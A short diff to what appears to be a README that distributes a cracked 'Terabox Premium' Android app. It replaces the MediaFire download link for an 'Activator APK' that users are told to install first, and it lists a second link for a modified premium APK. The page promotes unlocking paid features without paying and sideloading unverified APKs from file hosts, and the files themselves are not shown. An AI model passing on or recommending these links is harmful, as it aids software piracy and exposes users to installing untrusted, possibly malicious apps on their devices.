@@ -6,7 +6,7 @@
 
 ## Download Links
 
-1. **Activator APK (Must Install First):** [Download Activator](https://www.mediafire.com/file/aa2vlfxevdimfym/terabox_activator_%25282%2529.apk/file)  
+1. **Activator APK (Must Install First):** [Download Activator](https://www.mediafire.com/file/4247avvqtnosgto/Terabox_Premium_Activator.apk/file)  
 2. **Terabox Premium APK (Version 4.13):** [Download Terabox](https://www.mediafire.com/file/0h58f7j1vqnok4p/TeraBox_Premium_v4.13.apk/file)  
 
 ---
